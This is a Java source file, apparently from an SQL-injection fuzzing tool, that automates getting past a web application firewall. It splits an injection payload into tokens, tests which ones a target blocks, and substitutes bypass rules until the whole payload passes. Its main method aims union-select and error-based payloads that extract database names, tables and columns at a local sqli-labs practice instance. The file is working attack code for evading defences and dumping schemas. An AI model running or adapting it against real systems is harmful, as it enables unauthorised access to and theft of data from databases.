package com.sqldd.payloadOrigin.utils;

import com.sqldd.fuzzingWaf.PageComparison;
import com.sqldd.fuzzingWaf.utils.BypassTxtOprator;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Stack;

public class HeuristicUtils {

    /**
     * 启发式探测,主要输入pre,boundary,suf。返回最长探测boundary
     * @return null所有规则使用后仍然无法绕过，!null绕过后的boundary
     */
    public String heuristicDetection(String url, String method,HashMap<String,String> params, String injectingKey, HashMap<String,String> normalvalue1,HashMap<String,String> normalvalue2, String pre, String boundary, String suf){
        PageComparison pageComparison = new PageComparison(url,method);
        BypassTxtOprator bypassTxtOprator = new BypassTxtOprator();
        ArrayList<String> simgleAllBypassRules = bypassTxtOprator.getBypassFromTxt(url,"simgle");//获取<单字符>绕过规则
        ArrayList<String> doubleAllBypassRules = bypassTxtOprator.getBypassFromTxt(url, "order_by_"+method);
        //ArrayList<String> doubleAllBypassRules = bypassTxtOprator.getBypassFromTxt(url, "double");
        //正常页面
        ArrayList<String> normalRst = pageComparison.getNormalPageComparison(normalvalue1, normalvalue2);
        //先把boundary拆分
        ArrayList<String> splitBoundarys = splitBoundary(boundary);

        ArrayList<String> newB = new ArrayList<>();//new boundary
        for (int i = 0; i < splitBoundarys.size(); i++) {
            String HeKeyword = "";
            //关键字是否被拦截
            params.put(injectingKey, splitBoundarys.get(i));
            int rate = pageComparison.getRate(normalRst, params);
            if(rate == 3) {//[关键字]被waf拦截
                //找到一个绕过的情况作为He(关键字)
                for (String simgleBypassRule : simgleAllBypassRules) {
                    StringBuilder builder1 = new StringBuilder(simgleBypassRule);
                    builder1.replace(builder1.indexOf("."), builder1.indexOf(".")+1, splitBoundarys.get(i));//将占位符替换为关键字
                    params.put(injectingKey, builder1.toString());
                    int rate1 = pageComparison.getRate(normalRst, params);
                    if(rate1 != 3){
                        HeKeyword = builder1.toString();
                        break;
                    }
                }
                //组合绕过waf
            }else{//关键字没被拦截
                HeKeyword = splitBoundarys.get(i);
            }
            //前面newBoundary和关键字的组合是否被拦截
            String newBpluskeyword = list2String(newB, HeKeyword);
            params.put(injectingKey, newBpluskeyword);
            int rate1 = pageComparison.getRate(normalRst, params);
            if(rate1 == 3){
                Stack<String> keyword2_Stack = new Stack<>();
                keyword2_Stack.push(HeKeyword);
                int ii = newB.size()-1;
                for (; ii >= 0; ii--) {
                    boolean bypassedFLAG = false;
                    String keyword2 = stack2String(keyword2_Stack);//<栈中元素组合String>
                    params.put(injectingKey, newB.get(ii)+keyword2);//判断<前一字符preKey>+<栈中元素组合String>是否被拦截
                    int rate2 = pageComparison.getRate(normalRst, params);
                    if(rate2 == 3){//被拦截，则keyword1就是<前一字符preKey>，keyword2就是<栈中元素组合String>
                        int ff = 1;
                        for (String doubleBypassRule : doubleAllBypassRules) {
                            StringBuilder rule = new StringBuilder(doubleBypassRule);
                            rule.replace(rule.indexOf("."), rule.indexOf(".")+1, newB.get(ii));//将占位符替换为keyword1
                            rule.replace(rule.indexOf("."), rule.indexOf(".")+1, keyword2);//将占位符替换为keyword2
                            params.put(injectingKey, rule.toString());
                            int rate3 = pageComparison.getRate(normalRst, params);
                            if(rate3 != 3){//绕过
                                //比如database在newB的位置是4，删除4以后的元素，He(database())取代位置4
                                ArrayList<String> tmp = new ArrayList<>();
                                for (int iii = 0; iii < ii; iii++) {
                                    tmp.add(newB.get(iii));
                                }
                                newB.removeAll(newB);
                                newB.addAll(tmp);
                                newB.add(rule.toString());
                                bypassedFLAG = true;
                                break;
                            }
                            ff++;//第ff条规则未生效
                        }
                        if(ff == doubleAllBypassRules.size()+1 && bypassedFLAG == false){//如果所有规则都未生效,返回null
                            return null;
                        }
                    }else//没被拦截，则<前一字符preKey>入栈
                        keyword2_Stack.push(newB.get(ii));
                    if(bypassedFLAG == true)
                        break;
                }
            }else
                newB.add(HeKeyword);
        }
        return pre + list2String(newB, suf);
    }

    //输入一个arraylist和string，返回string
    public String list2String(ArrayList<String> lists,String str){
        String strNew = "";
        for (String list : lists) {
            strNew += list;
        }
        return strNew + str;
    }

    //输入栈，返回string
    public String stack2String(Stack<String> stk){
        Stack<String> tmp = new Stack<>();
        tmp.addAll(stk);
        StringBuilder builder = new StringBuilder();
        while (!tmp.empty())
            builder.append(tmp.pop());
        return builder.toString();
    }

    //boundary拆分
    public ArrayList<String> splitBoundary(String boundary){
        ArrayList<String> rsts = new ArrayList<>();

        for (int i = 0,j=0; j < boundary.length(); j++) {
            if(boundary.charAt(j) == ' ' || boundary.charAt(j) == ',' || boundary.charAt(j) == '('){
                rsts.add(boundary.substring(i, j));
                rsts.add(boundary.substring(j, j+1));
                i = j+1;
            }else if(j == boundary.length()-1){
                rsts.add(boundary.substring(i, j+1));
            }
        }

        return rsts;
    }


    public static void main(String[] args) {
        HeuristicUtils heuristicUtils = new HeuristicUtils();
        String url = "http://localhost/sqli-labs/Less-1/";
        String method = "get";
        HashMap<String, String> params = new HashMap<>();
        params.put("id", "anyx");
        String injectingKey ="id";
        HashMap<String, String> normal1 = new HashMap<String, String>() {{
            put("id", "1");
        }};
        HashMap<String, String> normal2 = new HashMap<String, String>() {{
            put("id", "2");
        }};
        String [] normalvalue = {"1","2"};
        String pre = "-1'";
        //String boundary = "union select 1,group_concat(0x7e,column_name,0x7e),3 from information_schema.columns where table_name='users'";
        //String boundary = "union select 1,group_concat(0x7e,schema_name,0x7e),3 from information_schema.schemata";
        //String boundary = "xor exp(~(select * from(select concat(0x7e,(select group_concat(0x5e,table_name,0x5e) from information_schema.tables where table_schema='security'),0x7e))a))";
        String boundary = "union select 1,database(),3";
        String suf = "-- ";
        String s1 = heuristicUtils.heuristicDetection(url, method, params, injectingKey, normal1, normal2, pre, boundary, suf);
        System.out.println(s1);

       /* String url = "http://localhost/sqli-labs/Less-12/";
        String method = "post";
        HashMap<String, String> params = new HashMap<>();
        params.put("uname", "admin");
        params.put("passwd", "admin");
        params.put("submit", "Submit");
        String injectingKey ="uname";
        HashMap<String, String []> normalvalue = new HashMap<String,String[]>(){
            {
                put("uname", new String[]{"admin1", "admin2"});
                put("passwd", new String[]{"admin1", "admin2"});
                put("submit", new String[]{"Submit", "Submit"});
            }
        };
        String pre = "admin\")";
        //String boundary = "union select 1,group_concat(0x7e,column_name,0x7e),3 from information_schema.columns where table_name='users'";
        //String boundary = "union select 1,group_concat(0x7e,schema_name,0x7e),3 from information_schema.schemata";
        String boundary = "xor exp(~(select * from(select concat(0x7e,(select group_concat(0x5e,table_name,0x5e) from information_schema.tables where table_schema='security'),0x7e))a))";
        String suf = "-- ";
        String s1 = heuristicUtils.heuristicDetection(url, method, params, injectingKey, normalvalue, normalvalue, pre, boundary, suf);
        System.out.println(s1);*/
    }
}